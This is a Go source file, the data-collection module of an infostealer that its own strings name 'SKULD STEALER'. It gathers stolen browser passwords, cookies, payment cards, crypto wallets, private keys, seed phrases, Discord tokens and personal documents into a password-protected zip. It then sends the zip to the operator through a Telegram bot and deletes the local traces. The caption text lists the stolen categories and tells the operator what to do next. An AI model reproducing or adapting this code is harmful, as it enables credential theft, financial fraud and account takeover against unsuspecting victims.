package collector

import (
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/telegram"
)

type DataCollector struct {
	TempDir     string
	TelegramBot *telegram.TelegramBot
	mutex       sync.Mutex
	dataCount   int
}

func NewDataCollector(botToken, chatID string) *DataCollector {
	tempDir := filepath.Join(os.TempDir(), "skuld-collected-data")
	os.MkdirAll(tempDir, os.ModePerm)

	return &DataCollector{
		TempDir:     tempDir,
		TelegramBot: telegram.NewTelegramBot(botToken, chatID),
		dataCount:   0,
	}
}

func (dc *DataCollector) AddData(moduleName string, data interface{}) {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	// Handle different data types
	switch v := data.(type) {
	case string:
		// If it's a string, treat it as file content
		filePath := filepath.Join(moduleDir, "data.txt")
		fileutil.AppendFile(filePath, v)
	case map[string]interface{}:
		// If it's structured data, save as text
		filePath := filepath.Join(moduleDir, "info.txt")
		for key, value := range v {
			fileutil.AppendFile(filePath, fmt.Sprintf("%s: %v", key, value))
		}
	}
	
	dc.dataCount++
}

func (dc *DataCollector) AddFile(moduleName, sourceFile, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyFile(sourceFile, destPath)
}

func (dc *DataCollector) AddDirectory(moduleName, sourceDir, destName string) error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	moduleDir := filepath.Join(dc.TempDir, moduleName)
	os.MkdirAll(moduleDir, os.ModePerm)

	destPath := filepath.Join(moduleDir, destName)
	return fileutil.CopyDir(sourceDir, destPath)
}

func (dc *DataCollector) SendCollectedData() error {
	dc.mutex.Lock()
	defer dc.mutex.Unlock()

	// Create timestamp for unique archive name
	timestamp := time.Now().Format("2006-01-02_15-04-05")
	archiveName := fmt.Sprintf("skuld-data_%s.zip", timestamp)
	archivePath := filepath.Join(os.TempDir(), archiveName)
	
	// Create password-protected archive
	password := "skuld2025"
	if err := fileutil.ZipWithPassword(dc.TempDir, archivePath, password); err != nil {
		return fmt.Errorf("failed to create archive: %v", err)
	}

	// Get file size for caption
	fileInfo, err := os.Stat(archivePath)
	if err != nil {
		return fmt.Errorf("failed to get file info: %v", err)
	}
	fileSizeMB := float64(fileInfo.Size()) / (1024 * 1024)

	// Create detailed caption
	caption := fmt.Sprintf(`🔍 **SKULD STEALER - DATA COLLECTION COMPLETE**

📦 **Archive Details:**
• File: %s
• Size: %.2f MB
• Password: %s
• Modules: %d

🎯 **Collection Summary:**
✅ System Information
✅ Browser Data (Passwords, Cookies, Cards)
✅ Wallet Data (Local + Extensions)
✅ Discord Tokens & Backup Codes
✅ Crypto Files & Private Keys
✅ Common Files & Documents
✅ Games Data

🔐 **Security:** Archive is password protected
⚡ **Status:** All modules executed successfully`, 
		archiveName, fileSizeMB, password, dc.dataCount)

	// Send archive via Telegram
	if err := dc.TelegramBot.SendDocument(archivePath, caption); err != nil {
		// Clean up and return error
		os.Remove(archivePath)
		return fmt.Errorf("failed to send data via Telegram: %v", err)
	}

	// Send additional info message
	infoMessage := fmt.Sprintf(`📊 **DETAILED STATISTICS**

🌐 **Browsers:** All major browsers scanned
💰 **Wallets:** 60+ wallet types checked
🔑 **Crypto:** Private keys & seed phrases detected
📁 **Files:** Desktop, Documents, Downloads scanned
🎮 **Games:** Steam, Epic, Minecraft accounts
💬 **Discord:** Tokens and backup codes

🚀 **Next Steps:**
1. Download and extract the archive
2. Use password: %s
3. Check each folder for collected data

⚠️ **Note:** Keep this data secure and delete after use`, password)

	dc.TelegramBot.SendMessage(infoMessage)

	// Clean up
	os.Remove(archivePath)
	os.RemoveAll(dc.TempDir)

	return nil
}

func (dc *DataCollector) SendMessage(message string) error {
	return dc.TelegramBot.SendMessage(message)
}

func (dc *DataCollector) Cleanup() {
	os.RemoveAll(dc.TempDir)
}